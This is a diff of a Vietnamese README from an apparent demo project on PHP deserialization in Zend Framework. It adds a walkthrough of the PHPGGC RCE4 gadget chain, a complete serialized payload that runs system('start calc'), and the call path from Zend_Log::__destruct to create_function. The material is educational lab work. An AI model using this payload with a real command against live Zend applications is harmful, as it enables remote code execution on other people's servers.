@@ -108,20 +108,20 @@ Vì hàm `unserialize()` giải tuần tự hóa trực tiếp dữ liệu từ 
   <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Zend_index_payload.png?raw=true" alt="Phpggc_payload" width="800"/>
 </p>
 
-
-
 Khi payload chạy thành công, lệnh chèn vào được thực thi, ở đây là mở calculator
 
 <p align="center">
   <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Zend_index_calc.png?raw=true" alt="Phpggc_payload" width="800"/>
 </p>
 
-## 5. Phân tích gadget chain
+## 5. Phân tích Gadget chain
 ### 5.1. Khái niệm Gadget chain
-Gadget chain là một chuỗi các class và method (phương thức) có sẵn trong mã nguồn của một ứng dụng hoặc thư viện, mà khi được sắp xếp và kết hợp đúng cách thông qua quá trình unserialize(), sẽ dẫn đến hành vi nguy hiểm như thực thi mã tùy ý (RCE) hoặc thao túng luồng xử lý của ứng dụng.
+`Gadget chain` là một chuỗi các class và method có sẵn trong mã nguồn của một ứng dụng hoặc thư viện, mà khi được sắp xếp và kết hợp đúng cách thông qua quá trình `unserialize()`, sẽ dẫn đến hành vi nguy hiểm như thao túng luồng xử lý của ứng dụng dẫn đến RCE hay các lỗ hổng khác.
 
 Kẻ tấn công không cần tạo mã độc mới, mà chỉ cần tận dụng các đoạn mã có sẵn (gadget) và xây dựng chúng thành một chuỗi hoạt động độc hại.
+
 ### 5.2. Phân tích cụ thể
+Các gadget được chuẩn bị sẵn lấy từ mã nguồn `phpggc`: 
 ```php
 <?php
 
@@ -194,5 +194,87 @@ class Zend_Filter_Inflector
     }
 }
 ```
-### 
+
+Còn đây là chain để kết nối các gadget trên:
+```php
+<?php
+
+namespace GadgetChain\ZendFramework;
+
+class RCE4 extends \PHPGGC\GadgetChain\RCE\PHPCode
+{
+    public static $version = '? <= 1.12.20';
+    public static $vector = '__destruct';
+    public static $author = 'ydyachenko';
+
+    public static $information = '
+        - Based on ZendFramework/RCE1
+        - Works on PHP >= 7.0.0
+    ';
+
+    public function generate(array $parameters)
+    {
+        return new \Zend_Log(
+            [new \Zend_Log_Writer_Mail(
+                 [1],
+                 [],
+                 new \Zend_Mail,
+                 new \Zend_Layout(
+                     new \Zend_Filter_Inflector(),
+                     true,
+                     $parameters['code']
+                 )
+             )]
+        );
+    }
+}
+```
+
+Trong đó:
+- `Zend_Log`: Là entry point của gadget chain. Lớp này có thuộc tính `_writers`, là một mảng chứa các `writer`. Trong payload, mảng này chứa một đối tượng của `Zend_Log_Writer_Mail`, từ đó chuỗi gadget tiếp tục được kích hoạt.
+
+- `Zend_Log_Writer_Mail`: Là một writer gửi log qua email. Trong gadget chain, class này chứa các thuộc tính như _mail, _layout, _eventsToMail... đặc biệt _layout chính là điểm nối tiếp đến class quan trọng tiếp theo là `Zend_Layout` → nơi dẫn đến thực thi mã PHP.
+
+- `Zend_Layout`: Lớp này dùng để render layout cho view trong Zend. Thuộc tính `_inflector` được truyền vào là một đối tượng của class `Zend_Filter_Inflector`, và quan trọng nhất là `_layout` – là biến được gán giá trị là mã PHP muốn thực thi thông qua khởi tạo từ `$parameters['code']`.
+
+- `Zend_Filter_Inflector`: Đây là lớp có chức năng tạo chuỗi dựa trên các quy tắc lọc. Nó chứa thuộc tính _rules, trong đó có thể chứa các callback function.
+
+- `Zend_Filter_Callback`: Là lớp chứa thuộc tính _callback, mặc định gán là "create_function", và _options chứa mảng tham số. Khi callback này được thực thi trong quá trình xử lý inflector, create_function sẽ tạo và thực thi đoạn mã PHP.
+
+Gadget chain sau đó được tổng hợp thành một chuỗi được tuần tự hóa (serialized string) theo định dạng của hàm `serialize()` trong PHP:
+```php
+O:8:"Zend_Log":1:{s:11:"*_writers";a:1:{i:0;O:20:"Zend_Log_Writer_Mail":5:{s:16:"*_eventsToMail";a:1:{i:0;i:1;}s:22:"*_layoutEventsToMail";a:0:{}s:8:"*_mail";O:9:"Zend_Mail":0:
+{}s:10:"*_layout";O:11:"Zend_Layout":3:{s:13:"*_inflector";O:21:"Zend_Filter_Inflector":1:{s:9:"*_rules";a:1:{s:6:"script";a:1:{i:0;O:20:"Zend_Filter_Callback":2:
+{s:12:"*_callback";s:15:"create_function";s:11:"*_options";a:1:{i:0;s:0:"";}}}}}s:20:"*_inflectorEnabled";b:1;s:10:"*_layout";s:26:"){}system("start calc");/*";}s:22:"*_subjectPrependText";N;}}}
+```
+
+Cấu trúc của một chuỗi serialized object gồm:
+- O:<length>:"ClassName":<property_count>:{...} – đại diện cho một đối tượng.
+- s:<length>:"property_name" – tên thuộc tính.
+- a:<size>:{...} – một mảng (array).
+- i:<int> – số nguyên.
+- s:<length>:"string" – chuỗi.
+- N – null.
+- b:0 hoặc b:1 – boolean false hoặc true.
+
+Tổng quát quá trình thực thi:
+- Khi đối tượng Zend_Log bị gọi hủy (qua __destruct() hoặc một thao tác log), nó sẽ gọi writer là Zend_Log_Writer_Mail.
+  
+- Writer này lại xử lý layout để format nội dung email, và thông qua chuỗi phụ thuộc (Zend_Layout → Zend_Filter_Inflector → Zend_Filter_Callback) sẽ gọi create_function() chứa mã độc.
+
+- Nếu mã này là system("start calc"), máy chủ sẽ thực thi lệnh mở calculator.
+
+- Chuỗi thực hiện:
+```
+  Zend_Log::__destruct()
+          └── Zend_Log_Writer_Mail::shutdown()
+              └── Zend_Layout::render()
+                  └── Zend_Filter_Inflector::filter($_layout)
+                        └── Zend_Filter_Callback::filter()
+                              └── create_function('', ')}{system("start calc");/*')
+                                    └── system("start calc")
+```
+
+### 5.3. Debbug trực tiếp trên ứng dụng
+
 
